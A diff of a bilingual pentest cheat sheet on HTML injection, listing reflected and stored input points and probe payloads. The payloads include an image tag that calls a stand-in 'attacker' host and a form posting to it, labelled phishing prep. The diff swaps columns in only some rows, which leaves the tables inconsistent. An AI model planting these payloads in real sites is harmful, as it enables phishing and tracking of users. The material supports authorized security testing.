@@ -21,15 +21,15 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Search query | `?q=USER_INPUT` reflejado en results | Standard. |
+| `?q=USER_INPUT` reflejado en results | Search query | Standard. |
 | Comment / forum post | Body persistido + visible | Stored injection. |
-| User profile fields | `name`, `bio`, `signature` | Stored. |
-| Error pages | `?id=BAD_INPUT` reflejado en error message | Reflected. |
+| `name`, `bio`, `signature` | User profile fields | Stored. |
+| `?id=BAD_INPUT` reflejado en error message | Error pages | Reflected. |
 | URL params reflected | Any `?param=value` que aparezca en page | Standard. |
 | Email subjects/body | Email rendered como HTML | Stored. |
 | Filename uploads | Filename reflected en gallery | Stored. |
 | Custom user fields | App-specific custom inputs | Per app. |
-| Headers reflejados | `User-Agent`, `Referer` reflected en page | Common in admin panels. |
+| `User-Agent`, `Referer` reflected en page | Headers reflejados | Common in admin panels. |
 | 404 / error pages | Path reflejado en "Not found: <path>" | Easy reflected. |
 | Confirmation messages | "Welcome, <name>!" | Stored. |
 | Address fields | Shipping addresses display literal | E-commerce. |
@@ -46,23 +46,23 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Bold tag | `<b>BOLD</b>` | Texto en negrita = inyección activa. |
-| Italic | `<i>italic</i>` | Same. |
-| Underline | `<u>underline</u>` | Same. |
-| Heading | `<h1>BIG</h1>` | Heading rendered. |
-| Image broken | `<img src=x>` | If renders broken image. |
-| Image with src | `<img src="https://attacker/log">` | Confirms HTML + outbound. |
-| Anchor link | `<a href="https://attacker">click</a>` | Anchor visible + clickable. |
-| Line break | `<br>` | Breaks layout = injected. |
-| Horizontal rule | `<hr>` | Same. |
-| Inline style | `<span style="color:red">x</span>` | Color visible = style applied. |
-| Inline form | `<form action="https://attacker">...</form>` | Phishing prep. |
+| `<b>BOLD</b>` | Bold tag | Texto en negrita = inyección activa. |
+| `<i>italic</i>` | Italic | Same. |
+| `<u>underline</u>` | Underline | Same. |
+| `<h1>BIG</h1>` | Heading | Heading rendered. |
+| `<img src=x>` | Image broken | If renders broken image. |
+| `<img src="https://attacker/log">` | Image with src | Confirms HTML + outbound. |
+| `<a href="https://attacker">click</a>` | Anchor link | Anchor visible + clickable. |
+| `<br>` | Line break | Breaks layout = injected. |
+| `<hr>` | Horizontal rule | Same. |
+| `<span style="color:red">x</span>` | Inline style | Color visible = style applied. |
+| `<form action="https://attacker">...</form>` | Inline form | Phishing prep. |
 | Confirm reflection | Search response for input verbatim | Standard. |
 | Differentiate from XSS | If `<script>` blocked but `<img>` allowed = HTML injection only | Filter check. |
-| Probe encoding state | `<` rendered as `&lt;` = escaped (safe) | Detect filter. |
-| Marker patterns | `<!--MARKER-->` o `<HTMLINJ>` | Easy grep en response. |
+| `<` rendered as `&lt;` = escaped (safe) | Probe encoding state | Detect filter. |
+| `<!--MARKER-->` o `<HTMLINJ>` | Marker patterns | Easy grep en response. |
 | Length-based | Long HTML triggers different render | Edge. |
-| Reflection context | `<input value="USER_INPUT">` (attribute context) | Different injection. |
+| `<input value="USER_INPUT">` (attribute context) | Reflection context | Different injection. |
 ^htmli-detect-probes
 
 ### Probe rápido manual
